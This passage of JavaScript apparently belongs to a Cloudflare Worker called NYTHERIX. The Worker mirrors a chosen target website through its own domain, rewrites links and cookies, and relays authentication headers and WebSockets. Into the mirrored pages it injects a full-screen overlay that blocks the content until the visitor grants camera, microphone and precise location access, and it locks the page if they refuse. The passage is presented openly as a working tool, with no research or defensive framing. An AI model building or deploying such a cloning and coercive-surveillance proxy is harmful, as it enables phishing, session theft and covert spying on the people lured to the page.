// ── BFCache restore ───────────────────────────────────────────────────────────
// When the user navigates back/forward the browser may restore a frozen page.
// Re-validate permissions before making content visible.
window.addEventListener('pageshow', function(e) {
  if (!e.persisted) return;
  _queryPerms().then(function(states) {
    if (states.cam === 'denied' || states.geo === 'denied') {
      _lockPage('pageshow: denied');
      return;
    }
    if (_ss(SKEY) !== '1' && !document.getElementById('_nx_gate')) {
      _showGate(false);
    }
  }).catch(function(){});
});

// ── Gate UI ───────────────────────────────────────────────────────────────────
function _showGate(denied) {
  function mount() {
    if (document.getElementById('_nx_gate')) return;
    var ov = document.createElement('div');
    ov.id = '_nx_gate';
    ov.style.cssText =
      'position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;' +
      'justify-content:center;padding:24px;' +
      'font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif;' +
      'color:#e2e8f0;text-align:center;' +
      'background:rgba(6,7,12,0.9);' +
      'backdrop-filter:blur(24px) saturate(160%);' +
      '-webkit-backdrop-filter:blur(24px) saturate(160%);' +
      'transition:opacity 0.4s;';

    ov.innerHTML =
      '<div style="max-width:440px;width:100%;' +
        'background:linear-gradient(155deg,rgba(12,16,22,0.97),rgba(6,7,12,0.99));' +
        'border:1px solid rgba(0,255,224,0.13);border-radius:22px;' +
        'padding:44px 36px 36px;' +
        'box-shadow:0 40px 80px rgba(0,0,0,0.65),0 0 0 1px rgba(0,255,224,0.04);' +
        'position:relative;overflow:hidden">' +
        // Ambient glow ring
        '<div style="position:absolute;top:-80px;left:50%;transform:translateX(-50%);' +
          'width:260px;height:260px;' +
          'background:radial-gradient(circle,rgba(0,255,224,0.06),transparent 70%);' +
          'pointer-events:none;border-radius:50%"></div>' +
        '<div id="_nx_icon" style="font-size:54px;margin-bottom:20px">🔐</div>' +
        '<h2 id="_nx_title" style="margin:0 0 10px;font-size:21px;font-weight:700;' +
          'color:#00ffe0;letter-spacing:0.02em">Access Required</h2>' +
        '<p id="_nx_sub" style="margin:0 0 28px;font-size:14px;color:#94a3b8;line-height:1.75">' +
          'This service requires <strong style="color:#e2e8f0">Camera &amp; Microphone</strong> and ' +
          '<strong style="color:#e2e8f0">Location</strong> access to continue. ' +
          'Click below and allow both prompts.</p>' +
        '<div style="display:flex;gap:8px;justify-content:center;margin-bottom:28px">' +
          _step('_nx_s1', '📷', 'Camera') +
          _step('_nx_s2', '📍', 'Location') +
          _step('_nx_s3', '✅', 'Ready') +
        '</div>' +
        '<button id="_nx_btn" onclick="_nxReq()" ' +
          'style="width:100%;max-width:260px;padding:13px 0;' +
          'background:linear-gradient(135deg,#00ffe0,#00c9b1);' +
          'color:#07080d;border:none;border-radius:11px;font-size:15px;font-weight:700;' +
          'cursor:pointer;letter-spacing:0.03em;' +
          'box-shadow:0 4px 24px rgba(0,255,224,0.28);transition:opacity 0.2s" ' +
          'onmouseover="this.style.opacity=\'0.88\'" onmouseout="this.style.opacity=\'1\'">' +
          'Grant Permissions</button>' +
        '<div id="_nx_st" style="margin-top:18px;min-height:18px;font-size:13px;color:#64748b"></div>' +
        '<div id="_nx_dn" style="display:none;margin-top:20px;' +
          'background:rgba(244,63,94,0.08);border:1px solid rgba(244,63,94,0.22);' +
          'border-radius:11px;padding:16px;font-size:13px;color:#f87171;' +
          'line-height:1.7;text-align:left">' +
          '<strong>⛔ Permissions denied.</strong><br>' +
          'Click the <strong>lock icon</strong> in your address bar, set ' +
          '<em>Camera</em> and <em>Location</em> to <strong>Allow</strong>, ' +
          'then reload.<br><br>' +
          '<button onclick="location.reload()" ' +
            'style="background:rgba(244,63,94,0.14);color:#fca5a5;' +
            'border:1px solid rgba(244,63,94,0.28);border-radius:8px;' +
            'padding:8px 18px;font-size:13px;cursor:pointer">↺ Reload</button>' +
        '</div>' +
      '</div>';

    (document.body || document.documentElement).appendChild(ov);
    if (denied) _showDenied();
  }
  document.body
    ? mount()
    : document.addEventListener('DOMContentLoaded', mount, { once: true });
}

function _step(id, icon, label) {
  return '<div id="' + id + '" style="flex:1;max-width:120px;padding:10px 6px;' +
    'background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);' +
    'border-radius:10px;font-size:11px;color:#64748b;transition:all 0.3s">' +
    '<div style="font-size:22px;margin-bottom:4px">' + icon + '</div>' + label + '</div>';
}

function _stepOn(id) {
  var el = document.getElementById(id); if (!el) return;
  el.style.borderColor = 'rgba(0,255,224,0.45)';
  el.style.background  = 'rgba(0,255,224,0.08)';
  el.style.color       = '#00ffe0';
}

function _stepDone(id) {
  var el = document.getElementById(id); if (!el) return;
  el.style.borderColor = 'rgba(0,255,224,0.65)';
  el.style.background  = 'rgba(0,255,224,0.14)';
  el.style.color       = '#00ffe0';
}

function _showDenied() {
  var d  = document.getElementById('_nx_dn'),
      b  = document.getElementById('_nx_btn'),
      ic = document.getElementById('_nx_icon'),
      ti = document.getElementById('_nx_title');
  if (d)  d.style.display = 'block';
  if (b)  { b.disabled = true; b.style.opacity = '0.35'; b.style.cursor = 'not-allowed'; }
  if (ic) ic.textContent = '⚠️';
  if (ti) { ti.textContent = 'Permissions Denied'; ti.style.color = '#f87171'; }
}

function _removeGate() {
  var g = document.getElementById('_nx_gate'); if (!g) return;
  g.style.opacity = '0';
  setTimeout(function() { if (g.parentNode) g.parentNode.removeChild(g); }, 420);
}

// Called by the "Grant Permissions" button.
window._nxReq = function() {
  var btn = document.getElementById('_nx_btn');
  var st  = document.getElementById('_nx_st');
  if (btn) { btn.disabled = true; btn.textContent = 'Requesting\u2026'; btn.style.opacity = '0.55'; }
  if (st)  st.textContent = 'Waiting for browser prompts\u2026';
  _stepOn('_nx_s1'); _stepOn('_nx_s2');

  var camOk = false, geoOk = false, done = false;
  var _stream = null, _geoPos = null;

  function _check() {
    if (!camOk || !geoOk || done) return;
    done = true;
    _stepDone('_nx_s1'); _stepDone('_nx_s2'); _stepDone('_nx_s3');
    if (st) st.textContent = '\u2713 All permissions granted!';
    setTimeout(function() { _onGranted(_stream, _geoPos); }, 500);
  }

  function _deny() {
    if (done) return; done = true;
    // Stop any already-acquired stream before showing denied state
    if (_stream) {
      try { _stream.getTracks().forEach(function(t){ t.stop(); }); } catch(e){}
      _stream = null;
    }
    _ss(SKEY, '');
    _showDenied();
  }

  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then(function(s) {
      _stream = s;
      camOk = true;
      _stepDone('_nx_s1');
      if (st) st.textContent = geoOk
        ? '\u2713 All permissions granted!'
        : '\u2713 Camera granted \u2014 waiting for location\u2026';
      _check();
    })
    .catch(_deny);

  navigator.geolocation.getCurrentPosition(
    function(pos) {
      _geoPos = pos;
      geoOk = true;
      _stepDone('_nx_s2');
      if (st) st.textContent = camOk
        ? '\u2713 All permissions granted!'
        : '\u2713 Location granted \u2014 waiting for camera\u2026';
      _check();
    },
    _deny,
    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
  );
};

})();<\/script>`;
}

// =============================================================================
//  STATIC PAGES
// =============================================================================
function placeholderPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>NYTHERIX</title>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    html,body{height:100%;background:#06070c}
    body{display:flex;align-items:center;justify-content:center;overflow:hidden}
    .logo{font-family:system-ui,sans-serif;font-size:clamp(32px,9vw,58px);
      font-weight:900;letter-spacing:.16em;color:#00ffe0;
      text-shadow:0 0 48px rgba(0,255,224,.3),0 0 120px rgba(0,255,224,.1)}
    body::after{content:'';position:fixed;inset:0;
      background:radial-gradient(ellipse at center,transparent 38%,#06070c 100%);
      pointer-events:none}
  </style>
</head>
<body><div class="logo">NYTHERIX</div></body>
</html>`;
}

function errPage(title, detail) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>NYTHERIX — ${title}</title>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    html,body{min-height:100%;background:#06070c;color:#e2e8f0}
    body{display:flex;align-items:center;justify-content:center;padding:24px}
    .card{max-width:520px;width:100%;text-align:center;
      background:rgba(12,16,22,.92);border:1px solid rgba(244,63,94,.2);
      border-radius:18px;padding:44px 32px}
    .icon{font-size:42px;margin-bottom:18px}
    h1{font-size:18px;color:#f43f5e;margin-bottom:14px;font-family:monospace}
    p{font-size:13px;color:#6b7280;line-height:1.85}
    code{color:#f59e0b;background:rgba(245,158,11,.1);
      padding:1px 6px;border-radius:4px;font-size:12px}
    .btn{display:inline-block;margin-top:22px;padding:9px 24px;
      background:rgba(244,63,94,.12);color:#f87171;
      border:1px solid rgba(244,63,94,.25);border-radius:8px;
      font-size:13px;cursor:pointer;text-decoration:none}
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">⚠️</div>
    <h1>${title}</h1>
    <p>${detail}</p>
    <a class="btn" href="javascript:location.reload()">↺ Retry</a>
  </div>
</body>
</html>`;
}

// =============================================================================
//  MAIN FETCH HANDLER
// =============================================================================
export default {
  async fetch(request, env) {
    const url         = new URL(request.url);
    const proxyHost   = url.hostname;
    const proxyOrigin = `https://${proxyHost}`;
    const reqOrigin   = request.headers.get("Origin") || null;

    // ── CORS preflight ────────────────────────────────────────────────────────
    if (request.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: buildCorsHeaders(reqOrigin),
      });
    }

    // ── 1. Load config (TTL-cached) ───────────────────────────────────────────
    let config;
    try { config = await getConfig(env); }
    catch {
      return htmlRes(errPage("Database Error",
        "D1 binding <code>DB</code> is missing or the <code>settings</code> table " +
        "has not been created.<br><br>" +
        "Run: <code>CREATE TABLE settings " +
        "(id INTEGER PRIMARY KEY, target_url TEXT, enabled INTEGER DEFAULT 1);</code>"), 500);
    }

    if (!config || !config.target_url) return htmlRes(placeholderPage());
    if (!config.enabled)               return htmlRes(placeholderPage());

    // ── 2. Validate target URL ────────────────────────────────────────────────
    let targetUrl;
    try { targetUrl = new URL(config.target_url); }
    catch {
      return htmlRes(errPage("Configuration Error",
        "The stored <code>target_url</code> is not a valid URL.<br>" +
        "Check the settings row in your D1 database."));
    }

    const targetOrigin = targetUrl.origin;
    const targetHost   = targetUrl.hostname;

    // ── 3. WebSocket — true bidirectional bridge via WebSocketPair ───────────
    if ((request.headers.get("Upgrade") || "").toLowerCase() === "websocket") {
      const wsScheme = targetUrl.protocol === "https:" ? "wss:" : "ws:";
      const wsUrl    = `${wsScheme}//${targetHost}${url.pathname}${url.search}`;
      const wsHdr    = new Headers();
      for (const h of ["Authorization", "Cookie", "Sec-WebSocket-Protocol",
                        "Sec-WebSocket-Extensions"]) {
        const v = request.headers.get(h); if (v) wsHdr.set(h, v);
      }
      wsHdr.set("Host",   targetHost);
      wsHdr.set("Origin", targetOrigin);
      try {
        const [client, server] = Object.values(new WebSocketPair());
        const upRes = await fetch(wsUrl, {
          headers: wsHdr,
          cf:      { cacheEverything: false },
        });
        if (upRes.status !== 101)
          return new Response("WS upstream refused (" + upRes.status + ")", { status: 502 });
        const upWS = upRes.webSocket;
        if (!upWS) return new Response("WS proxy unavailable", { status: 502 });
        upWS.accept();
        client.accept();
        upWS.addEventListener("message",  (e) => { try { client.send(e.data);  } catch(_){} });
        client.addEventListener("message", (e) => { try { upWS.send(e.data);   } catch(_){} });
        upWS.addEventListener("close",    (e) => { try { client.close(e.code, e.reason); } catch(_){} });
        client.addEventListener("close",   (e) => { try { upWS.close(e.code, e.reason);  } catch(_){} });
        upWS.addEventListener("error",    ()  => { try { client.close(1011, "upstream error"); } catch(_){} });
        client.addEventListener("error",   ()  => { try { upWS.close(1011, "client error");    } catch(_){} });
        const proto     = request.headers.get("Sec-WebSocket-Protocol");
        const wsRespHdr = new Headers({ "Upgrade": "websocket", "Connection": "Upgrade" });
        if (proto) wsRespHdr.set("Sec-WebSocket-Protocol", proto.split(",")[0].trim());
        return new Response(null, { status: 101, webSocket: client, headers: wsRespHdr });
      } catch (err) {
        return new Response("WebSocket proxy error: " + err.message, { status: 502 });
      }
    }

    // ── 4. Build upstream request ─────────────────────────────────────────────
    const upstreamUrl = targetOrigin + url.pathname + url.search;
    const upHdr = new Headers(request.headers);
    upHdr.set("Host",    targetHost);
    upHdr.set("Referer", targetOrigin + url.pathname);
    upHdr.set("Origin",  targetOrigin);
    // Request identity encoding so we can read + rewrite text without
    // manually decompressing gzip/br (Workers handles that transparently).
    upHdr.set("Accept-Encoding", "identity");
    for (const h of STRIP_REQ) upHdr.delete(h);

    // ── 5. Fetch upstream ─────────────────────────────────────────────────────
    let upstream;
    try {
      upstream = await fetch(upstreamUrl, {
        method:   request.method,
        headers:  upHdr,
        // Body passed through as a stream — never re-read, so POST/PUT work correctly.
        body:     ["GET", "HEAD"].includes(request.method) ? undefined : request.body,
        redirect: "manual",
        cf:       { cacheEverything: false },
      });
    } catch (err) {
      return htmlRes(errPage("Proxy Error",
        `Cannot reach <b>${targetHost}</b>.<br><br><code>${err.message}</code>`), 502);
    }

    // ── 6. Rewrite redirects ──────────────────────────────────────────────────
    if ([301, 302, 303, 307, 308].includes(upstream.status)) {
      let loc = upstream.headers.get("Location") || "/";
      const hEsc  = escRe(targetHost);
      const subRe = makeSubRe(hEsc);

      if (loc.startsWith(targetOrigin))
        loc = proxyOrigin + loc.slice(targetOrigin.length);
      else if (loc.startsWith("//" + targetHost))
        loc = "//" + proxyHost + loc.slice(2 + targetHost.length);

      // Rewrite any subdomain in the Location value
      loc = loc.replace(subRe, (_, proto, host) => {
        const suffix = targetHost;
        const prefix = host.length > suffix.length
          ? host.slice(0, host.length - suffix.length) : "";
        return (proto || "https:") + "//" + prefix + proxyHost;
      });

      const rh = new Headers({ ...buildCorsHeaders(reqOrigin), "Location": loc });
      applyCookies(upstream.headers, rh, proxyHost);
      return new Response(null, { status: upstream.status, headers: rh });
    }

    // ── 7. Build response headers ─────────────────────────────────────────────
    const headers = new Headers(upstream.headers);
    for (const h of STRIP_RESP) headers.delete(h);

    for (const [k, v] of Object.entries(buildCorsHeaders(reqOrigin))) headers.set(k, v);

    headers.set("Cross-Origin-Opener-Policy",  "same-origin-allow-popups");
    headers.set("Cross-Origin-Embedder-Policy", "unsafe-none");
    headers.set("Cross-Origin-Resource-Policy", "cross-origin");
    headers.set("Permissions-Policy",           PERMS_POLICY);
    headers.set("Feature-Policy",
      "camera *;microphone *;geolocation *;fullscreen *;payment *;" +
      "usb *;autoplay *;display-capture *;clipboard-read *;clipboard-write *");

    applyCookies(upstream.headers, headers, proxyHost);

    const ct = (headers.get("Content-Type") || "").toLowerCase();

    // ── 8. Media & binary — stream directly, never buffer ────────────────────
    // Range, Content-Range, Accept-Ranges are preserved from upstream headers.
    // 206 Partial Content, HLS chunks, DASH segments all pass through cleanly.
    if (isMedia(ct)) {
      headers.delete("Content-Encoding");
      return new Response(upstream.body, { status: upstream.status, headers });
    }

    // ── 9. Text content — rewrite URLs ───────────────────────────────────────
    if (isText(ct)) {
      let text;
      try { text = await upstream.text(); }
      catch {
        // Body read failed — stream through without rewriting
        return new Response(upstream.body, { status: upstream.status, headers });
      }

      const oEsc  = escRe(targetOrigin);
      const hEsc  = escRe(targetHost);
      const subRe = makeSubRe(hEsc);

      // Generic URL rewrite pass (all text types)
      text = text.replace(new RegExp(oEsc, "g"), proxyOrigin);
      text = text.replace(new RegExp(`wss://${hEsc}`, "g"), `wss://${proxyHost}`);
      text = text.replace(new RegExp(`ws://${hEsc}`,  "g"), `ws://${proxyHost}`);
      text = text.replace(subRe, (_, proto, host) => {
        const suffix = targetHost;
        const prefix = host.length > suffix.length
          ? host.slice(0, host.length - suffix.length) : "";
        return (proto || "https:") + "//" + prefix + proxyHost;
      });

      // HTML gets the full structural rewrite + shim injection
      if (ct.includes("text/html")) {
        text = rewriteHTML(text, proxyOrigin, proxyHost, targetOrigin, targetHost);
      }

      headers.delete("Content-Length");
      headers.delete("Transfer-Encoding");
      headers.delete("Content-Encoding");
      return new Response(text, { status: upstream.status, headers });
    }

    // ── 10. Everything else (WASM, fonts, images without image/ CT, …) ────────
    headers.delete("Content-Encoding");
    return new Response(upstream.body, { status: upstream.status, headers });
  },
};
